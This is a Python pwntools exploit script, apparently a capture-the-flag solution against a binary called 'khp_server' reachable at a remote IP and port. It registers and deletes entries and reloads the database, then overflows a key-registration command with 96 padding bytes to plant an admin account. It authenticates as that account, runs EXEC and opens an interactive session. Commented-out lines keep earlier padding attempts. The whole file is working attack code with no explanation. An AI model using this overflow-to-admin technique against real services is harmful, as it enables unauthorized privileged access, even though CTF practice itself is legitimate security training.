from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./khp_server")

def start():
    if args.REMOTE:
        return remote("94.237.55.44", 57377)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return remote("127.0.0.1", 1337)
            #return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendline(b"REKE test:test test;")
#io.recvrepeat(1)
io.recvline()
io.sendline(b"REKE mago:mago mago;")
io.recvline()
#io.recvrepeat(1)
io.sendline(b"DEKE 2")
io.recvline()
#io.recvrepeat(1)
io.sendline(b"RLDB")
io.recvline()
#io.recvrepeat(1)
#io.sendline(b"REKE " + cyclic(72) + p64(0x65) + b"myuser:admin password;")
#io.sendline(b"REKE " + cyclic(88) + cyclic(8) + cyclic(8) + b"BBBBBBBB") # b"myuser:admin password;\x00")
io.sendline(b"REKE " + b"A"*(80 + 16) + b"magito:admin password;")

io.recvline()
io.sendline("REKE magito:admin password;")
io.recvline()

io.sendline("AUTH 3")
io.recvline()
io.sendline("EXEC")
#io.recvrepeat(1)

#io.sendline("RLDB")

#io.recvrepeat(1)

#io.sendline(b"DEKE 1")

#io.recvrepeat(1)

#io.sendline(b"REKE " + cyclic(88) + cyclic(8) + cyclic(8) + b"C"*8)

#io.recvrepeat(1)

#io.recvrepeat(1)
#io.sendline(b"RLDB")
#io.recvrepeat(1)
#io.sendline("SAVE 1")
#io.recvrepeat(1)
#io.sendline("RLDB")
#io.recvrepeat(1)
#io.sendline("REKE sexo:admin password")
#io.recvrepeat(1)
#io.sendline("AUTH 2")

io.interactive()
